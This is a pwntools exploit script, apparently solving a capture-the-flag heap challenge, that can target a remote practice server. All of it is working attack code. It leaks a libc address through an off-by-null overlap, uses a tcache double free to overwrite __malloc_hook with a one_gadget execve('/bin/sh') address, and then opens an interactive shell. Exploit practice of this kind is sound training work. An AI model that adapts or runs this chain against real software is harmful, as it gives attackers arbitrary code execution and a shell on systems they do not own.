from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
libc_path = "./libc-2.27.so"
ld_path = "/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("node4.buuoj.cn", 27286)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    #pause()


def new(size, data):
    io.sendlineafter("Your choice: ", "1")
    io.sendlineafter("Size:", str(size))
    io.sendlineafter("Data:", data)


def show(index):
    io.sendlineafter("Your choice: ", "2")
    io.sendlineafter("Index:", str(index))


def delete(index):
    io.sendlineafter("Your choice: ", "3")
    io.sendlineafter("Index:", str(index))


new(0x500, "a")
new(0x68, "a")
new(0x5f0, "a")
new(0x20, "a")

delete(1)
delete(0)

for i in range(9):
    new(0x68 - i, "b" * (0x68 - i))
    delete(0)

new(0x68, b"b" * 0x60 + p64(0x580)) #0
delete(2)

new(0x508, b"e" * 0x507) #1
show(0)

libc.address = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x3ebca0

new(0x68, "f" * 0x67) #2
delete(0)
delete(2) # double free, libc2.27 --> tcache

malloc_s0x13 = libc.symbols["__malloc_hook"] - 0x13
new(0x68, p64(malloc_s0x13))
new(0x68, "a")
"""
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
0x4f322 execve("/bin/sh", rsp+0x40, environ)
0x10a38c execve("/bin/sh", rsp+0x70, environ)
"""
ddebug()
new(0x68, b"a" * 0x13 + p64(libc.address + 0x4f322))

io.sendlineafter("Your choice: ", "1")
io.sendlineafter("Size:", "10")
io.interactive()
